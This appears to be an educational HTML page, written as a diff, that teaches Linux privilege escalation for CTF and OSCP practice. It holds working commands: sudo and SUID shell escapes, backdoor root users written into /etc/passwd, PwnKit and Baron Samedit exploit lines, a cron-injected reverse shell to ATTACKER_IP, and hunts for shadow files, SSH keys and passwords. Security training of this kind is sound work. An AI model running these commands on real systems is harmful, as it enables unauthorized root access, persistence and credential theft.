@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Linux Privilege Escalation — From Nobody to Root ☕</title>
+<link rel="stylesheet" href="../../assets/styles.css"/>
+</head>
+<body data-page-slug="linux-privesc">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../../index.html">Home</a>
+    <a href="../index.html" class="active">PrivEsc</a>
+    <a href="../../glossary/index.html">Glossary</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..."/>
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../../index.html">Home</a><span class="sep">›</span>
+  <a href="../index.html">04-Privilege-Escalation</a><span class="sep">›</span>
+  <span>Linux PrivEsc</span>
+</div>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-content">
+    <span class="coffee-badge">🐥 Intermediate · OSCP Core Topic · Real CVEs</span>
+    <h1>Linux Privilege Escalation</h1>
+    <p class="subtitle">You have a low-privilege shell. The flag is in /root.<br>
+    Between you and root: 10 classic techniques, all explained here.</p>
+    <div class="tagline">"Enumerate. Enumerate. Enumerate. Then exploit."</div>
+    <br>
+    <button class="cta-btn" onclick="document.getElementById('enum').scrollIntoView({behavior:'smooth'})">Get root 🔓</button>
+    <p style="margin-top:18px; font-size:12px; color:var(--ink-dim);">sudo abuse · SUID · cron · PATH hijack · capabilities · kernel exploits</p>
+  </div>
+</section>
+
+<!-- ═══════════════ CHAPTER 1: METHODOLOGY ═══════════════ -->
+<section class="chapter" id="enum">
+  <div class="chapter-num">Chapter 01 // Start Here</div>
+  <h2><span class="emoji">🔍</span> The golden rule: Enumerate first</h2>
+
+  <p class="lead">Every PrivEsc challenge (and real engagement) starts the same way: you got a low-privilege shell. You need root. Don't guess — enumerate. The answer is always there if you look in the right places.</p>
+
+  <div class="paper">
+    <h4>The PrivEsc Mindset 🧠</h4>
+    <p>Think about <span class="highlight">WHAT runs as root</span>. On a Linux system, root runs:</p>
+    <ul>
+      <li>SUID/SGID binaries (run as file owner, not as you)</li>
+      <li>Cron jobs (scheduled commands, often as root)</li>
+      <li>Services and daemons</li>
+      <li>Anything you can sudo</li>
+    </ul>
+    <p>Your job: find something root runs that you can <span class="highlight">influence or abuse</span>.</p>
+  </div>
+
+  <h3>First commands after getting a shell</h3>
+  <div class="code">
+<span class="com">## ── WHO AM I? ────────────────────────────────────────────</span>
+id                     <span class="com"># user, uid, groups</span>
+whoami                 <span class="com"># username</span>
+hostname               <span class="com"># machine name</span>
+uname -a               <span class="com"># kernel version (for kernel exploits)</span>
+cat /etc/os-release    <span class="com"># OS version</span>
+cat /proc/version      <span class="com"># kernel version + compiler</span>
+
+<span class="com">## ── WHAT CAN I DO AS SUDO? ────────────────────────────────</span>
+sudo -l                <span class="com"># ALWAYS run this first. Gold mine.</span>
+
+<span class="com">## ── WHAT USERS EXIST? ────────────────────────────────────</span>
+cat /etc/passwd        <span class="com"># list users (shell = /bin/bash means interactive)</span>
+cat /etc/shadow        <span class="com"># password hashes (need root to read usually)</span>
+getent passwd          <span class="com"># same as passwd but pulls from all sources</span>
+
+<span class="com">## ── ENVIRONMENT ──────────────────────────────────────────</span>
+env                    <span class="com"># environment variables (look for passwords, paths)</span>
+echo $PATH             <span class="com"># where commands are looked up</span>
+history                <span class="com"># command history (often has creds!)</span>
+cat ~/.bash_history
+  </div>
+
+  <div class="callout info">
+    <strong>🤖 Automated Enumeration:</strong> Run <code class="inline">linpeas.sh</code> for comprehensive automated enumeration. It checks hundreds of things in seconds.<br>
+    <code class="inline">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code>
+  </div>
+
+  <!-- INTERACTIVE DECISION TREE -->
+  <div class="playground" id="decision-tree">
+    <div class="playground-header"><h4>🗺️ Interactive PrivEsc Decision Tree</h4></div>
+    <div id="tree-container">
+      <div id="node-start" class="tree-node active">
+        <p style="font-size:1rem; margin-bottom:14px; color:var(--ink-dim);">You have a low-priv shell. What did <code class="inline">sudo -l</code> show?</p>
+        <div style="display:flex; gap:10px; flex-wrap:wrap;">
+          <button class="chip" onclick="showNode('node-sudo')">✅ I can sudo something</button>
+          <button class="chip" onclick="showNode('node-nosudo')">❌ Nothing (NOPASSWD not set)</button>
+          <button class="chip" onclick="showNode('node-all')">🔥 (ALL) ALL — I am root already!</button>
+        </div>
+      </div>
+      <div id="node-sudo" class="tree-node" style="display:none;">
+        <p style="color:var(--ink-dim); margin-bottom:12px;">Is the allowed command on GTFOBins?</p>
+        <div class="code safe" style="font-size:12px;">
+# Check GTFOBins: https://gtfobins.github.io
+# Search for the exact binary name
+# Look for "Sudo" tab
+        </div>
+        <div style="margin-top:10px; display:flex; gap:10px; flex-wrap:wrap;">
+          <button class="chip" onclick="showNode('node-gtfo')">✅ Yes, it's on GTFOBins</button>
+          <button class="chip" onclick="showNode('node-suid')">❌ No — check SUID next</button>
+        </div>
+      </div>
+      <div id="node-gtfo" class="tree-node" style="display:none;">
+        <p style="color:var(--accent); font-weight:700; margin-bottom:10px;">🔥 You likely have a path to root!</p>
+        <div class="code">
+<span class="com"># Example: sudo vim → root shell</span>
+sudo vim -c ':!/bin/bash'
+
+<span class="com"># Example: sudo find → root shell</span>
+sudo find . -exec /bin/sh \; -quit
+
+<span class="com"># Example: sudo python3 → root shell</span>
+sudo python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+<span class="com"># Always check: gtfobins.github.io/gtfobins/BINARY/#sudo</span>
+        </div>
+        <button class="chip" style="margin-top:10px;" onclick="showNode('node-start')">↩ Start over</button>
+      </div>
+      <div id="node-nosudo" class="tree-node" style="display:none;">
+        <p style="color:var(--ink-dim); margin-bottom:12px;">Check SUID binaries:</p>
+        <div class="code">find / -perm -4000 -type f 2>/dev/null</div>
+        <div style="margin-top:10px; display:flex; gap:10px; flex-wrap:wrap;">
+          <button class="chip" onclick="showNode('node-suid')">See SUID techniques →</button>
+          <button class="chip" onclick="showNode('node-cron')">Check Cron next →</button>
+        </div>
+      </div>
+      <div id="node-suid" class="tree-node" style="display:none;">
+        <p style="color:var(--ink-dim); margin-bottom:10px;">Common SUID wins: Check the SUID chapter below ↓</p>
+        <button class="chip" onclick="document.getElementById('suid').scrollIntoView({behavior:'smooth'}); showNode('node-start')">→ Jump to SUID Chapter</button>
+        <button class="chip" style="margin-left:8px;" onclick="showNode('node-cron')">Try Cron next →</button>
+      </div>
+      <div id="node-all" class="tree-node" style="display:none;">
+        <p style="color:var(--accent); font-weight:700;">🎉 If sudo -l shows (ALL:ALL) ALL with NOPASSWD, just run: <code class="inline">sudo su</code></p>
+        <button class="chip" style="margin-top:10px;" onclick="showNode('node-start')">↩ Start over</button>
+      </div>
+      <div id="node-cron" class="tree-node" style="display:none;">
+        <p style="color:var(--ink-dim); margin-bottom:10px;">Check cron — see Cron chapter below ↓</p>
+        <button class="chip" onclick="document.getElementById('cron').scrollIntoView({behavior:'smooth'}); showNode('node-start')">→ Jump to Cron Chapter</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 2: SUDO ABUSE ═══════════════ -->
+<section class="chapter" id="sudo">
+  <div class="chapter-num">Chapter 02 // Sudo Abuse</div>
+  <h2><span class="emoji">🔑</span> Sudo — The Most Common Win</h2>
+
+  <p class="lead"><code class="inline">sudo -l</code> shows what commands you can run as another user (usually root). Even "safe" programs have GTFOBins techniques to spawn shells.</p>
+
+  <div class="code">
+<span class="com">## First thing after shell — ALWAYS:</span>
+sudo -l
+
+<span class="com">## Example output (jackpot):</span>
+User www-data may run the following commands on target:
+    (root) NOPASSWD: /usr/bin/python3 /opt/backup.py
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/find /var/www/html
+  </div>
+
+  <h3>Top sudo binaries and their GTFOBins escapes</h3>
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>📝 vim / nano / less</h4>
+      <div class="code evil" style="font-size:12px; margin-top:8px;">
+<span class="com"># vim → root shell</span>
+sudo vim -c ':!/bin/bash'
+
+<span class="com"># nano: open /etc/sudoers, add yourself</span>
+sudo nano /etc/sudoers
+<span class="com"># add: yourusername ALL=(ALL) NOPASSWD: ALL</span>
+
+<span class="com"># less → shell escape</span>
+sudo less /etc/passwd
+<span class="com"># then type: !/bin/bash</span>
+      </div>
+    </div>
+    <div class="card">
+      <h4>🐍 python / python3</h4>
+      <div class="code evil" style="font-size:12px; margin-top:8px;">
+<span class="com"># Spawn root shell:</span>
+sudo python3 -c 'import os; os.system("/bin/bash")'
+
+<span class="com"># Or with pty (better shell):</span>
+sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+<span class="com"># Write to /etc/passwd:</span>
+sudo python3 -c '
+import crypt,os
+h=crypt.crypt("hacked","$6$salt")
+open("/etc/passwd","a").write(f"hacker:{h}:0:0::/root:/bin/bash\n")
+'
+      </div>
+    </div>
+    <div class="card">
+      <h4>🔍 find</h4>
+      <div class="code evil" style="font-size:12px; margin-top:8px;">
+<span class="com"># Execute shell via find:</span>
+sudo find . -exec /bin/sh \; -quit
+
+<span class="com"># Or:</span>
+sudo find / -name whatever -exec /bin/bash \;
+
+<span class="com"># Even if restricted path:</span>
+sudo find /var/www/html -exec /bin/sh \; -quit
+      </div>
+    </div>
+    <div class="card">
+      <h4>☕ java / perl / ruby / awk</h4>
+      <div class="code evil" style="font-size:12px; margin-top:8px;">
+<span class="com"># perl:</span>
+sudo perl -e 'exec "/bin/bash";'
+
+<span class="com"># ruby:</span>
+sudo ruby -e 'exec "/bin/bash"'
+
+<span class="com"># awk:</span>
+sudo awk 'BEGIN {system("/bin/bash")}'
+
+<span class="com"># Always check: gtfobins.github.io</span>
+      </div>
+    </div>
+  </div>
+
+  <h3>Sudo version exploit</h3>
+  <div class="callout danger">
+    <strong>💀 CVE-2021-3156 — Baron Samedit (sudo &lt; 1.9.5p2)</strong><br>
+    A heap-based buffer overflow in sudo. Allows any unprivileged user to gain root on Ubuntu, Debian, Fedora, CentOS — without needing sudo permissions at all. Just having sudo installed is enough.<br>
+    Check version: <code class="inline">sudo --version</code><br>
+    Exploit: <code class="inline">sudoedit -s '\' $(python3 -c 'print("A"*65536)')</code>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 3: SUID ═══════════════ -->
+<section class="chapter" id="suid">
+  <div class="chapter-num">Chapter 03 // SUID Binaries</div>
+  <h2><span class="emoji">🔴</span> SUID — Run as the File Owner</h2>
+
+  <p class="lead">SUID (Set User ID) means: when you run this binary, it runs with the <em>file owner's</em> permissions, not yours. If root owns a SUID binary — it runs as root. Even if YOU run it.</p>
+
+  <div class="code">
+<span class="com">## Find ALL SUID binaries on the system:</span>
+find / -perm -4000 -type f 2>/dev/null
+
+<span class="com">## Find SUID + SGID:</span>
+find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
+
+<span class="com">## Example output (spot the problem):</span>
+/usr/bin/passwd     ← legitimate (needed to change passwords)
+/usr/bin/sudo       ← legitimate
+/usr/bin/find       ← WAIT. find is SUID owned by root?! 🚨
+/opt/custom_backup  ← custom binary? 🚨🚨🚨
+  </div>
+
+  <h3>Exploiting common SUID binaries</h3>
+  <div class="code evil">
+<span class="com">## bash with SUID (the dream):</span>
+ls -la /bin/bash    <span class="com"># if SUID bit set:</span>
+/bin/bash -p        <span class="com"># -p preserves effective UID = root shell</span>
+
+<span class="com">## cp with SUID:</span>
+<span class="com"># Method 1: Copy /etc/shadow to readable location</span>
+/usr/bin/cp /etc/shadow /tmp/shadow
+cat /tmp/shadow | grep root    <span class="com"># crack the hash offline</span>
+
+<span class="com"># Method 2: Overwrite /etc/passwd</span>
+echo 'hacker:$(openssl passwd hacked):0:0::/root:/bin/bash' &gt;&gt; /etc/passwd
+
+<span class="com">## nmap with SUID (old versions):</span>
+nmap --interactive   <span class="com"># old nmap had interactive mode</span>
+<span class="com"># at nmap prompt:</span>
+!sh
+
+<span class="com">## Custom binary with SUID — analyze it:</span>
+strings /opt/custom_backup   <span class="com"># readable strings</span>
+ltrace /opt/custom_backup    <span class="com"># library calls</span>
+strace /opt/custom_backup    <span class="com"># system calls</span>
+<span class="com"># Look for: relative path calls → PATH hijack opportunity</span>
+  </div>
+
+  <div class="callout danger">
+    <strong>💀 CVE-2021-4034 — PwnKit (pkexec)</strong><br>
+    A vulnerability in pkexec (always SUID, installed everywhere). Present since 2009. Affects ALL major Linux distros. Local privilege escalation with a one-click exploit.<br>
+    <code class="inline">git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034 && make && ./cve-2021-4034</code>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 4: CRON JOBS ═══════════════ -->
+<section class="chapter" id="cron">
+  <div class="chapter-num">Chapter 04 // Cron Jobs</div>
+  <h2><span class="emoji">⏰</span> Cron — Scripts Running on a Schedule</h2>
+
+  <p class="lead">Cron jobs are commands that run automatically on a schedule. Many admins write backup scripts, cleanup scripts, or monitoring scripts — and run them as root. If you can modify those scripts, you own root.</p>
+
+  <div class="code">
+<span class="com">## Check all cron locations:</span>
+crontab -l                    <span class="com"># your user's crons</span>
+sudo crontab -l               <span class="com"># root's crons (if you can sudo)</span>
+cat /etc/crontab              <span class="com"># system-wide crons</span>
+cat /etc/cron.d/*             <span class="com"># additional cron files</span>
+ls -la /etc/cron.{hourly,daily,weekly,monthly}/  <span class="com"># time-based crons</span>
+
+<span class="com">## Watch crons executing in real time:</span>
+watch -n 1 "ps aux | grep -v grep | grep -E 'cron|backup|script'"
+
+<span class="com">## pspy — monitor processes without root (essential tool):</span>
+./pspy64   <span class="com"># shows ALL processes including those spawned by cron</span>
+<span class="com"># Download: github.com/DominicBreuker/pspy</span>
+  </div>
+
+  <h3>Attack: Writable script run by root cron</h3>
+  <div class="code evil">
+<span class="com">## Scenario: /etc/crontab has:</span>
+* * * * * root /opt/backup.sh    <span class="com"># runs every minute as root</span>
+
+<span class="com">## Check permissions:</span>
+ls -la /opt/backup.sh
+-rwxrwxrwx 1 root root 45 Jan 1 00:00 /opt/backup.sh  <span class="com"># world-writable! 🚨</span>
+
+<span class="com">## Inject reverse shell payload:</span>
+echo "bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1" &gt;&gt; /opt/backup.sh
+
+<span class="com">## On attacker machine — listen:</span>
+nc -lvnp 4444
+
+<span class="com">## Wait 1 minute → root shell arrives</span>
+
+<span class="com">## Alternative: add root user to /etc/passwd</span>
+echo 'echo "hacker:\$6\$salt\$HASH:0:0::/root:/bin/bash" &gt;&gt; /etc/passwd' &gt;&gt; /opt/backup.sh
+  </div>
+
+  <h3>Attack: Writable script DIRECTORY</h3>
+  <div class="code evil">
+<span class="com">## Even if the script isn't writable, if the DIRECTORY is:</span>
+ls -la /opt/   <span class="com"># if /opt/ is writable by you</span>
+
+<span class="com">## Delete the original and replace it:</span>
+mv /opt/backup.sh /opt/backup.sh.bak
+<span class="com"># Create your version:</span>
+cat &gt; /opt/backup.sh &lt;&lt;'EOF'
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1
+EOF
+chmod +x /opt/backup.sh
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 5: PATH HIJACKING ═══════════════ -->
+<section class="chapter" id="path">
+  <div class="chapter-num">Chapter 05 // PATH Hijacking</div>
+  <h2><span class="emoji">🛣️</span> PATH Hijack — Make root run YOUR code</h2>
+
+  <p class="lead">When a SUID binary or cron script calls another program using a <em>relative path</em> (like <code class="inline">backup</code> instead of <code class="inline">/usr/bin/backup</code>), it looks in the PATH directories to find it. You can put your evil version first.</p>
+
+  <div class="code evil">
+<span class="com">## Scenario: SUID binary /opt/service calls 'ps' without full path</span>
+strings /opt/service | grep -v lib | head -20
+<span class="com"># Output includes: "ps" without /usr/bin/ps prefix → vulnerable!</span>
+
+<span class="com">## Exploit:</span>
+<span class="com"># 1. Write your malicious 'ps' script:</span>
+cat &gt; /tmp/ps &lt;&lt;'EOF'
+#!/bin/bash
+/bin/bash -p    <span class="com"># -p preserves SUID bit → root shell</span>
+EOF
+chmod +x /tmp/ps
+
+<span class="com"># 2. Prepend /tmp to PATH:</span>
+export PATH=/tmp:$PATH
+
+<span class="com"># 3. Run the SUID binary:</span>
+/opt/service     <span class="com"># it finds /tmp/ps first → your code runs as root!</span>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 6: CAPABILITIES ═══════════════ -->
+<section class="chapter" id="caps">
+  <div class="chapter-num">Chapter 06 // Linux Capabilities</div>
+  <h2><span class="emoji">⚡</span> Capabilities — Partial Root Powers</h2>
+
+  <p class="lead">Capabilities let a binary have specific root-like powers without being SUID. Admins think this is safer. They're often wrong — some capabilities lead straight to root.</p>
+
+  <div class="code">
+<span class="com">## Find binaries with capabilities:</span>
+getcap -r / 2>/dev/null
+
+<span class="com">## Dangerous capabilities to look for:</span>
+/usr/bin/python3.8 = cap_setuid+ep    <span class="com"># can set UID → root shell</span>
+/usr/bin/perl = cap_setuid+ep         <span class="com"># same</span>
+/usr/bin/ruby = cap_setuid+ep         <span class="com"># same</span>
+/usr/bin/vim = cap_dac_read_search+ep <span class="com"># read any file → /etc/shadow!</span>
+/usr/bin/openssl = cap_setuid+ep      <span class="com"># can become root</span>
+  </div>
+
+  <div class="code evil">
+<span class="com">## cap_setuid on python3 → root shell:</span>
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+<span class="com">## cap_dac_read_search on vim → read shadow file:</span>
+vim /etc/shadow   <span class="com"># file appears normally, read the hash, crack offline</span>
+
+<span class="com">## cap_setuid on openssl → root:</span>
+openssl req -x509 -newkey rsa:4096 -keyout /tmp/key -out /tmp/cert -days 365 -nodes -subj '/CN=pwn'
+openssl s_server -key /tmp/key -cert /tmp/cert -port 4443 -quiet
+<span class="com"># connect back and setuid(0)</span>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 7: PASSWORDS EVERYWHERE ═══════════════ -->
+<section class="chapter" id="passwords">
+  <div class="chapter-num">Chapter 07 // Passwords in Plain Sight</div>
+  <h2><span class="emoji">🗝️</span> Credentials Left in the Open</h2>
+
+  <p class="lead">This one is embarrassingly common. Credentials in config files, history files, environment variables, and scripts. Always look here first — sometimes the path to root is just reading a file.</p>
+
+  <div class="code">
+<span class="com">## History files — goldmine:</span>
+cat ~/.bash_history
+cat ~/.zsh_history
+cat ~/.mysql_history
+cat ~/.nano_history
+
+<span class="com">## Config files with passwords:</span>
+find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
+find / -name "wp-config.php" 2>/dev/null      <span class="com"># WordPress DB creds</span>
+find / -name "config.php" 2>/dev/null
+find / -name ".env" 2>/dev/null               <span class="com"># Laravel, Django etc.</span>
+find / -name "id_rsa" 2>/dev/null             <span class="com"># SSH private keys</span>
+
+<span class="com">## Passwords in environment variables:</span>
+env | grep -iE "pass|pwd|key|token|secret|credential"
+
+<span class="com">## Database connection strings:</span>
+grep -r "password" /var/www/ 2>/dev/null
+grep -r "DB_PASS" /var/www/ 2>/dev/null
+
+<span class="com">## Check /opt, /home, /var/backups for anything interesting:</span>
+ls -laR /opt/ 2>/dev/null
+ls -laR /home/ 2>/dev/null
+cat /var/backups/*
+  </div>
+
+  <div class="callout success">
+    <strong>💡 Password reuse:</strong> If you find any password (database, application, backup), try it as: <code class="inline">su root</code>, <code class="inline">su otheruser</code>, and over SSH. Password reuse is real and common.
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 8: LINPEAS ═══════════════ -->
+<section class="chapter" id="tools">
+  <div class="chapter-num">Chapter 08 // Automation Tools</div>
+  <h2><span class="emoji">🤖</span> Automated Enumeration Tools</h2>
+
+  <p class="lead">Don't enumerate manually on exams or real engagements. Use these tools to run hundreds of checks in seconds, then focus your energy on what they flag.</p>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <div class="card-badge">Best</div>
+      <h4>🦚 LinPEAS</h4>
+      <p style="color:var(--ink-dim); font-size:0.9rem;">The most comprehensive Linux PrivEsc enumeration script. Color-coded output (red = critical, yellow = interesting). Checks 300+ things.</p>
+      <div class="code" style="font-size:12px; margin-top:8px;">
+<span class="com"># Download and run (requires internet on target):</span>
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+<span class="com"># Or transfer it:</span>
+<span class="com"># attacker: python3 -m http.server 8000</span>
+wget http://ATTACKER_IP:8000/linpeas.sh
+chmod +x linpeas.sh && ./linpeas.sh 2&gt;/dev/null | tee /tmp/linpeas.out
+      </div>
+    </div>
+    <div class="card">
+      <h4>🔭 pspy</h4>
+      <p style="color:var(--ink-dim); font-size:0.9rem;">Watch running processes and cron jobs in real time WITHOUT root. Catches cron jobs that run briefly and disappear. Essential for cron abuse.</p>
+      <div class="code" style="font-size:12px; margin-top:8px;">
+<span class="com"># Download:</span>
+wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
+chmod +x pspy64 && ./pspy64
+
+<span class="com"># Watch for processes running as UID=0 (root)</span>
+<span class="com"># Look for scripts being executed</span>
+      </div>
+    </div>
+    <div class="card">
+      <h4>🔑 linux-exploit-suggester</h4>
+      <p style="color:var(--ink-dim); font-size:0.9rem;">Checks kernel version against known exploits. Suggests specific CVEs you can use. Good last resort if nothing else works.</p>
+      <div class="code" style="font-size:12px; margin-top:8px;">
+wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
+chmod +x linux-exploit-suggester.sh
+./linux-exploit-suggester.sh
+      </div>
+    </div>
+    <div class="card">
+      <h4>📊 GTFOBins</h4>
+      <p style="color:var(--ink-dim); font-size:0.9rem;">The reference bible. If any binary shows up in sudo or SUID results, look it up here. Every binary that can be abused is documented.</p>
+      <div class="code" style="font-size:12px; margin-top:8px;">
+<span class="com"># Website:</span>
+https://gtfobins.github.io
+
+<span class="com"># Search by binary name</span>
+<span class="com"># Filter by: sudo, suid, capabilities</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 9: QUICK CHECKLIST ═══════════════ -->
+<section class="chapter" id="checklist">
+  <div class="chapter-num">Chapter 09 // The Checklist</div>
+  <h2><span class="emoji">✅</span> PrivEsc Checklist — Run Through Every Time</h2>
+
+  <div class="playground">
+    <div class="playground-header"><h4>📋 Interactive PrivEsc Checklist — click to track progress</h4></div>
+    <div id="checklist-items" style="display:flex; flex-direction:column; gap:6px;">
+    </div>
+    <div style="margin-top:14px; color:var(--ink-dim); font-size:0.9rem;">
+      Progress: <span id="check-count">0</span> / <span id="check-total">0</span> checked
+    </div>
+  </div>
+
+  <h3>Where to practice</h3>
+  <div class="code safe">
+TryHackMe Paths (FREE):
+→ Privilege Escalation    https://tryhackme.com/room/linprivesc
+→ Linux PrivEsc           https://tryhackme.com/room/linuxprivescarena
+→ Common Linux Privesc    https://tryhackme.com/room/commonlinuxprivesc
+
+HackTheBox Machines (good for PrivEsc practice):
+→ Beep, Lame, Legacy (classic easy boxes)
+→ Search retired machines: hackthebox.com/machines
+→ Watch IppSec's walkthroughs after attempting
+  </div>
+</section>
+
+<section class="chapter">
+  <h3>🚀 Next Up</h3>
+  <div class="grid cols-3">
+    <a class="card is-link" href="../windows-privesc/index.html">
+      <h4>🪟 Windows PrivEsc</h4>
+      <p>Token impersonation, AlwaysInstallElevated, unquoted service paths.</p>
+    </a>
+    <a class="card is-link" href="../../05-Post-Exploitation/persistence/index.html">
+      <h4>🚪 Post-Exploitation</h4>
+      <p>You're root. Now maintain access and move laterally.</p>
+    </a>
+    <a class="card is-link" href="../../tryhackme/index.html">
+      <h4>🏴‍☠️ CTF Walkthroughs</h4>
+      <p>See these techniques applied on real machines.</p>
+    </a>
+  </div>
+</section>
+
+<script src="../../assets/app.js"></script>
+<script src="../../assets/glossary.js"></script>
+<script>
+function showNode(id) {
+  document.querySelectorAll('.tree-node').forEach(n => n.style.display = 'none');
+  document.getElementById(id).style.display = 'block';
+}
+
+const checks = [
+  "Run: sudo -l",
+  "Run: id && whoami && hostname",
+  "Run: uname -a (kernel version)",
+  "Run: cat /etc/os-release",
+  "Run: find / -perm -4000 -type f 2>/dev/null (SUID binaries)",
+  "Run: getcap -r / 2>/dev/null (capabilities)",
+  "Run: crontab -l && cat /etc/crontab",
+  "Run: ls -laR /etc/cron.* (cron directories)",
+  "Run: cat ~/.bash_history",
+  "Run: env (environment variables)",
+  "Run: find / -name '*.conf' 2>/dev/null | xargs grep -l 'password'",
+  "Run: find / -name '.env' -o -name 'wp-config.php' 2>/dev/null",
+  "Run: find / -name 'id_rsa' 2>/dev/null (SSH keys)",
+  "Run: ls -la /home/*/",
+  "Run: cat /var/backups/* 2>/dev/null",
+  "Check writable /etc/passwd: ls -la /etc/passwd",
+  "Check NFS shares: cat /etc/exports",
+  "Upload and run linpeas.sh",
+  "Upload and run pspy64 (watch cron)",
+  "Check services: ps aux && ss -tulpn",
+];
+
+const checkList = document.getElementById('checklist-items');
+document.getElementById('check-total').textContent = checks.length;
+let done = 0;
+
+checks.forEach((c, i) => {
+  const div = document.createElement('div');
+  div.style.cssText = 'display:flex; align-items:center; gap:10px; padding:8px 10px; cursor:pointer; border-radius:6px; transition:background 0.1s;';
+  div.innerHTML = `
+    <div id="cb-${i}" style="width:18px; height:18px; border:1px solid rgba(0,255,157,0.3); border-radius:4px; flex-shrink:0; display:flex; align-items:center; justify-content:center;"></div>
+    <span id="ct-${i}" style="font-family:var(--mono); font-size:13px; color:var(--ink-dim);">${c}</span>
+  `;
+  div.onmouseover = () => div.style.background = 'rgba(0,255,157,0.05)';
+  div.onmouseout = () => div.style.background = '';
+  div.onclick = () => {
+    const cb = document.getElementById('cb-'+i);
+    const ct = document.getElementById('ct-'+i);
+    const checked = cb.innerHTML !== '';
+    cb.innerHTML = checked ? '' : '✓';
+    cb.style.background = checked ? '' : 'var(--accent)';
+    cb.style.color = '#000';
+    cb.style.fontWeight = '700';
+    cb.style.borderColor = checked ? 'rgba(0,255,157,0.3)' : 'var(--accent)';
+    ct.style.textDecoration = checked ? '' : 'line-through';
+    ct.style.color = checked ? 'var(--ink-dim)' : 'var(--ink-mute)';
+    done += checked ? -1 : 1;
+    document.getElementById('check-count').textContent = done;
+  };
+  checkList.appendChild(div);
+});
+</script>
+</body>
+</html>
